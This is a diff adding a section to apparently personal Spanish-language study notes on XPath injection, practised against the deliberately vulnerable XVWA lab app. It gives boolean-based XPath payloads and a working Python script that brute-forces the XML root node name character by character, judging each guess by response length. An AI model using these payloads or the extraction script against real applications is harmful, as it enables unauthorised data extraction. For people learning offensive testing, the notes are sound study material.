@@ -1057,3 +1057,61 @@ if __name__='__main__':
 # 25. inyecciones xpath
 son similares a la inyecciones sql
 
+ocurren cuando el atacante altera de user input para queries xpath cuando se busca y nevega entre documentos XML
+
+consecuencias:
+- exposicion de datos
+- compromiso en la integridad de datos
+- DoS
+
+1' and count(/* )='2
+`search=1' and substring(name(/*[1]), 1, 1)=' C&submit=`
+con este payload, ya se puede iterar por cada caracter y revisar el codigo que devuelve
+
+%%> para estas situaciones cuando usar python y cuando bash?%%
+
+`1' and count(/*[1]/*)>'7`
+- el '1 intenta cerrar una cadena de texto que ya estaba en la consulta original
+- el `/*[1]/*` va desde la raiz del documento, selecciona el primer elemento de esos hijos
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+import requests, sys, signal, time, pdb, string
+
+def def_handler(sig, frame):
+    print("\n\n [!] saliendo")
+    sys.exit(1)
+
+main_url="http://192.168.50.10/xvwa/vulnerabilities/xpath"
+characters = string.ascii_letters
+
+def xPathInj():
+    data = ""
+    p1 = log.progress("fuerza bruta")
+    p1.status("inicializando")
+
+    time.sleep(2)
+
+    p2 = log.progress("data")
+
+    for position in range(1, 8):
+        for character in characters:
+            post_data = {
+                'search': "1' and substring(name(/*[1]), %d, 1)='%s" % (position, character),
+                'submit': ''
+            }
+
+            response = requests.post(main_url, data=post_data)
+            if len(response.text)!=8681:
+                data += character
+                p2.status(data)
+                break
+
+    p1.success(":) ataque de fuerza bruta concluido")
+    p2.success(data)
+
+if __name__ == "__main__":
+    xPathInj() 
+```
